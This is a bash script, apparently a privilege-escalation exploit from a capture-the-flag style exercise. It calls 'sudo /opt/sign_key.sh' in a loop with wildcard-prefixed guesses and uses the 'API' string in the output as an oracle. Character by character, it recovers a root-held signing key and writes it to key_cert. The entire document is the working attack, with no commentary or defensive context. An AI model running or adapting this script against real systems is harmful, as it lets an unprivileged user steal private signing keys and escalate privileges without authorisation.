#!/bin/bash

characters='=-+ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789/ !'
key=""

while true; do

	cp new_key new_key2

	for (( x=0; x<${#characters}; x++ )); do

		char="${characters:$x:1}"

		if [[ $char == "!" ]]; then
			char="\n"
		fi

		echo -e "*$char$key" > new_key

		sudo /opt/sign_key.sh new_key test_id root test 1 | grep "API" 1>/dev/null

		if [[ $? -eq 0 ]]; then
			key="${char}${key}"
			break
		fi

    done

	echo -e "$key" > new_key

	diff new_key new_key2 1>/dev/null

    if [[ $? -eq 0 ]]; then
        break
    fi

done

rm new_key2

mv new_key key_cert
